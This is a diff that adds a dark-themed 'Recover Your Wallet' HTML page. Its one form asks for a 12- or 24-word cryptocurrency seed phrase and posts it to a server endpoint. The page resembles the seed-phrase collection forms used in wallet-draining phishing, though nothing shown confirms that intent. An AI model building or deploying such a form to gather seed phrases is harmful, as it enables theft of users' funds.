@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Recover Wallet</title>
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #121212;
+      color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .recover-box {
+      background: #1e1e1e;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      max-width: 420px;
+      width: 100%;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    textarea {
+      width: 100%;
+      height: 80px;
+      padding: 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      background-color: #2a2a2a;
+      border: 1px solid #444;
+      color: #fff;
+      margin-bottom: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #00aaff;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #33bbff;
+    }
+  </style>
+</head>
+<body>
+  <div class="recover-box">
+    <h1>Recover Your Wallet</h1>
+    <form method="POST" action="/recover">
+      <label for="seed">Enter your seed phrase:</label>
+      <textarea name="seed" placeholder="Enter 12 or 24-word seed phrase..." required></textarea>
+      <button type="submit">Recover</button>
+    </form>
+  </div>
+</body>
+</html>
